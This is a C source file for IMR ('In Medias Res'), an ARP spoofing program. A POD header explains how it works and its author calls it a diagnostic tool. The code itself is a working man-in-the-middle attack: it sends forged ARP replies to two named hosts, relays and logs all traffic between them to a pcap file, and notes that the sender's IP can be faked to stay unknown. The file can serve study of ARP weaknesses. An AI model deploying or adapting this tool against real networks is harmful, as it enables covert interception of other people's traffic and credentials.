/***************************************************************************************************************
IMR -- In Medias Res
Copyright (C) 2005 Bastian Rieck (canmore [AT] sdf-eu.org)

* This program is free software; you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation; either version 2 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU General Public License for more details.
* You should have received a copy of the GNU General Public License
* along with this program; if not, write to the Free Software
* Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

Version history (major changes):
0.1: Capture timeouts
0.2: Reset of victims' ARP table
0.3: No hard-coded MAC addresses anymore *blush*; command-line parameters are evaluated
0.4: Finally: "Usage..." is printed ;)
0.5: Support for libpcap log format
0.6: BPF_WORDALIGN used properly

=pod

=head1 NAME 
        
IMR -- an ARP table attack program

=head1 SYNOPSIS

B<imr> I<ether_addr> I<ip_addr> I<ether_addr> I<ip_addr> I<ether_addr> I<ip_addr> I<interface> [I<logfile>]

=head1 DESCRIPTION

B<IMR> is short for 'In Medias Res'. It is a program that allows you to perform an ARP table 
attack on two hosts, named  I<client> and I<server>. Thus, all traffic from the server to 
the client will be sent to you, as well as all traffic from the client to the server. B<IMR>
simply routes all incoming data to the appropriate host and logs it to your disk for further
inspections.

B<IMR> gives you the ability to check whether your network is secured against ARP
attacks. Furthermore, it allows you to analyze networking protocols in great detail
without changing data.

=head2 HOW IT WORKS

This is what B<IMR> does:

=over 12

=item Send (forged) ARP replies

Two ARP replies of the form 'a.b.c.d is at AB:CD:EF:GH' are sent to both the client
and the server, hence ensuring that both hosts consider this PC the current communication
partner.

=item Read data

Now all incoming data is read. A loop checks whether they originate from the client or from
the server. During this check, the destination address of the current Ethernet frame is set
to the proper MAC address, so that the packets don't get stuck.

=item Log data

Everything is logged in raw format, i.e. each packet plus all of its payload is written to
the disk. The log file does not look good, but it will allow a complete reconstruction of
each packet.

=item Reset the ARP tables

After the routing has been cancelled, two ARP replies are sent that restore the ARP
table, so that the proper MAC addresses are set.

=back

=head2 WHY IT WORKS

To work properly, ARP needs an ARP table, in which pairs of MAC addresses and IP addresses
are saved. This is why your kernel 'knows' the destination address of the Ethernet frame. Unfortunately,
ARP doesn't check whether packets have been requested or not. So you are able to poison the ARP
table by sending your own ARP replies that say something like 'You will find this IP address at my
MAC address'. There is no possibility for ARP to validate your MAC address / IP address pair,
so it will be added to the table.

=head1 CAVEATS

Please be aware of the fact that B<IMR> is a diagnostic application. The code will give
you some information about the I<Berkeley Packet Filter>, B<BPF>, but B<IMR> is really I<not>
meant as an attack tool of any sort. Even if you are the administrator of your LAN,
you are by no means allowed to capture the data of your users without telling them...

=head1 OTHER INFO

You might find newer versions of IMR at http://canmore.sdf-eu.org

=head1 COPYRIGHT

B<IMR> is licenced under the B<GNU General Public Licence>. Read the file B<GPL> in IMR's 
directory for more information.

=head1 AUTHOR

B<IMR> has been written by Bastian Rieck <canmore [AT] sdf-eu.org>

=cut
******************************************************************************************************************/

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>

#include <netinet/in.h>
#include <arpa/inet.h>

#include <net/bpf.h>
#include <net/ethernet.h>
#include <ifaddrs.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

#include <pcap.h>
#include <signal.h>

#include "mod_bpf.h"
#include "mod_eth.h"
#include "mod_arp.h"

// Globals. They are not nice but make your life
// much easier

int run_loop = 1;
int bpf = -1;

// sig_handler(): Handles SIGINT to abort the capture loop
void sig_handler( int dummy )
{
  printf( "\n- Aborting capture (NOTE: This may take a while. Don't panic)\n" );
  run_loop = 0;
}

// main(): Sends the packets
int main( int argc, char* argv[]  )
{
  int buf_len = 0;
  int sent_bytes = 0;

  char* log_file;
  
  // Intro and some preparations
  
  printf( "\n"
	  "IMR (In Medias Res) 0.6, Copyright (C) 2008 Bastian Rieck\n"
	  "IMR comes with ABSOLUTELY NO WARRANTY; for details look at\n"
	  "the file 'GPL'. This is free software, and you are welcome\n"
	  "to redistribute it under certain conditions; read 'GPL'\n"
	  "for details.\n\n" );

  signal( SIGINT, sig_handler );
  
  // the MACs will be stored in ether_addr structures, see
  // ethers (3) for more details.
  
  ether_addr my_mac;
  ether_addr server_mac;
  ether_addr client_mac;

  ether_addr *mac_ptr; // just to avoid NULL pointers

  // IP addresses

  unsigned long my_ip;
  unsigned long server_ip;
  unsigned long client_ip;

  // read in all parameters
  
  if( argc < 8 )
    {
      fprintf( stderr, 
	       "Usage:\n\timr ether_addr ip_addr ether_addr ip_addr ether_addr ip_addr\n\tinterface [logfile]\n\n"
	       "- Supply your MAC address and your IP address\n"
	       "- Supply the server's MAC address and IP address (client 1)\n"
	       "- Supply the client's MAC address and IP address (client 2)\n"
	       "- Specify an interface and an optional logfile\n\n" );
      return( -1 );
    }
  else
    {

      // MAC address that shall be used to refer to this PC

      if( ( mac_ptr = ether_aton( argv[ 1 ] ) ) != NULL )
	memcpy( &my_mac, mac_ptr, sizeof( my_mac ) );
      else
	{
	  fprintf( stderr,
		   "ERROR: Could not read this PC's MAC: '%s'\n",
		   argv[ 1 ] );
	  return( -1 );
	}

      // This PC's IP address; it is possible to fake it, so you can
      // remain unknown

      if( ( my_ip = inet_addr( argv[ 2 ] ) ) == INADDR_NONE )
	{
	  fprintf( stderr,
		   "ERROR: Could not read this PC's IP address(errno = %i)\n",
		   errno );
	  return( -1 );
	}

      // MAC & IP address of client 1 = server
      
      if( ( mac_ptr = ether_aton( argv[ 3 ] ) ) != NULL )
	memcpy( &server_mac, mac_ptr, sizeof( my_mac ) );
      else
	 {
	   fprintf( stderr,
		   "ERROR: Could not read the server's MAC: '%s'\n",
		   argv[ 3 ] );
	  return( -1 );
	}      
      
      if( ( server_ip = inet_addr( argv[ 4 ] ) ) == INADDR_NONE )
	{
	  fprintf( stderr,
		   "ERROR: Could not read the server's IP address(errno = %i)\n",
		   errno );
	  return( -1 );
	}

      // MAC address of client 2 = client
      
      if( ( mac_ptr = ether_aton( argv[ 5 ] ) ) != NULL )
	memcpy( &client_mac, mac_ptr, sizeof( my_mac ) );
      else
	{
	 fprintf( stderr,
		  "ERROR: Could not read the client's MAC: '%s'\n",
		  argv[ 5 ] );
	 return( -1 );
       }

      if( ( client_ip = inet_addr( argv[ 6 ] ) ) == INADDR_NONE )
	{
	  fprintf( stderr,
		   "ERROR: Could not read the client's IP address(errno = %i)\n",
		   errno );
	  return( -1 );
	}
      
      printf( "- Eavesdropping data between '%s' and '%s'\n", argv[ 4 ], argv[ 6 ] );
      printf( "- Capture device is '%s'\n", argv[ 7 ] );

      // check whether a log file has been specified
      if( argc >= 9 )
	{
	  printf( "- Using log file '%s'\n", argv[ 8 ] );
	  
	  log_file = new char[ strlen( argv[ 8 ] ) + 1 ];
	  strcpy( log_file, argv[ 8 ] );
	}
      else
	{
	  log_file = new char[ strlen( "/dev/null" ) + 1 ];
	  strcpy( log_file, "/dev/null" );
	}
      
      /****************************************
	Just FYI, this was the old approach:
	atoh( argv[ 2 ], my_mac, 6 );
	atoh( argv[ 3 ], poisoned_mac, 6 );
	atoh( argv[ 5 ], original_mac, 6 );
      *****************************************/
    }

  // open BPF and set capture interface as well as
  // necessary parameters

  bpf = bpf_open( argv[ 7 ] );
  if( bpf == -1 )
    {
      fprintf( stderr, "ERROR: bpf is -1. Aborting...\n" );
      return( -1 );
    }
  
  buf_len = bpf_prepare( bpf, 3 );
  if( buf_len < 0 )
    {
      fprintf( stderr, "ERROR: bpf_prepare() failed. Aborting...\n" );

      close( bpf );
      return( -1 );
    }
  
 

  // send spoofed ARP packet to the server...

  sent_bytes = send_arp_reply( bpf, 
			       my_mac.octet, 
			       client_ip, 
			       server_mac.octet,
			       server_ip );

  printf( "- (%i) '%s' is at '%s'\n", sent_bytes, argv[ 6 ], ether_ntoa( &my_mac ) );

  // ...and to the client
  
  sent_bytes = -1;
  sent_bytes = send_arp_reply( bpf,
			       my_mac.octet,
			       server_ip,
			       client_mac.octet,
			       client_ip );

  printf( "- (%i) '%s' is at '%s'\n", sent_bytes, argv[ 4 ], ether_ntoa( &my_mac ) );

  // capture and forward all taffic between the two poisoned
  // hosts

  int log = open( log_file, O_RDWR | O_TRUNC | O_CREAT );
  int read_bytes = 0;
  int sum = 0;

  pcap_file_header f_hdr;
  pcap_pkthdr p_hdr;

  timeval tv;

  // write the file header for the log file
  
  f_hdr.magic = 0xa1b2c3d4;
  f_hdr.version_major = 2;
  f_hdr.version_minor = 4;
  f_hdr.thiszone = 0; // no time correction
  f_hdr.sigfigs = 0; // no accuracy
  f_hdr.snaplen = buf_len;
  
  // we are working with ethernet. This corresponds to LINKTYPE_ETHERNET
  // from /usr/src/contrib/libpcap/savefile.c
  f_hdr.linktype = DLT_EN10MB;

  write( log, &f_hdr, sizeof( f_hdr ) );

  // run the sniffing process
  
  ethernet_frame* frame;
  bpf_hdr* bpf_buf = new bpf_hdr[ buf_len ];
  bpf_hdr* bpf_packet;

  while( run_loop )
    {
      memset( bpf_buf, 0, buf_len );

      if( ( read_bytes = read( bpf, bpf_buf, buf_len ) ) > 0 )
	{
	  int i = 0;

	  // read all packets that are included in bpf_buf. BPF_WORDALIGN is used
	  // to proceed to the next BPF packet that is available in the buffer.
	
	/*  for( bpf_packet = bpf_buf; 
	       ( bpf_packet - bpf_buf ) < read_bytes;
	       bpf_packet += BPF_WORDALIGN( bpf_buf->bh_hdrlen + bpf_buf->bh_caplen ))
	*/
	    
	    char* ptr = reinterpret_cast<char*>(bpf_buf);
	    while(ptr < (reinterpret_cast<char*>(bpf_buf) + read_bytes))
	    {
	      bpf_packet = reinterpret_cast<bpf_hdr*>(ptr);
	      frame = (ethernet_frame*) ( (char*) bpf_packet + bpf_packet->bh_hdrlen);

	      // prepare the packet header and write the *original* packet to
	      // the log file (but only if it is from one of the 'targets')

	      gettimeofday( &tv, NULL );
	      p_hdr.ts = tv;
     	      p_hdr.caplen = bpf_packet->bh_caplen;
	      p_hdr.len = bpf_packet->bh_datalen;

	      
	      // a packet from the server (client1)
	      
	      if( memcmp( frame->src_addr, server_mac.octet, 6 ) == 0 )
		{	     
		  write( log, &p_hdr, sizeof( p_hdr ) );
		  write( log, (char*)bpf_packet + bpf_packet->bh_hdrlen, bpf_packet->bh_caplen );
		  
		  memcpy( frame->dest_addr, client_mac.octet, 6 );
		  write( bpf, frame, bpf_packet->bh_caplen );
		}

	      // a packet from the client (client2 )
	      
	      else if( memcmp( frame->src_addr, client_mac.octet, 6 ) == 0 )
		{	     
		  write( log, &p_hdr, sizeof( p_hdr ) );
		  write( log, (char*)bpf_packet + bpf_packet->bh_hdrlen, bpf_packet->bh_caplen );
		  
		  memcpy( frame->dest_addr, server_mac.octet, 6 );
		  write( bpf, frame, bpf_packet->bh_caplen );
		}

		ptr += BPF_WORDALIGN(bpf_packet->bh_hdrlen + bpf_packet->bh_caplen);
	    }
	}
    }

  // reset the ARP table of the server...

  sent_bytes = send_arp_reply( bpf, 
			       client_mac.octet,
			       client_ip, 
			       server_mac.octet,
			       server_ip);

  printf( "- (%i) '%s' is at '%s'\n", sent_bytes, argv[ 6 ], ether_ntoa( &client_mac ) );
  
  // ...and of the client
  
  sent_bytes = -1;
  sent_bytes = send_arp_reply( bpf,
			       server_mac.octet,
			       server_ip,
			       client_mac.octet,
			       client_ip);
  
  printf( "- (%i) '%s' is at '%s'\n", sent_bytes, argv[ 4 ], ether_ntoa( &server_mac ) );
  
  // tidy up

  printf( "- Cleaning up. Log is '%s'\n", log_file );
  
  delete[] bpf_buf;
  delete []log_file;

  close( log );
  return( 0 );
}
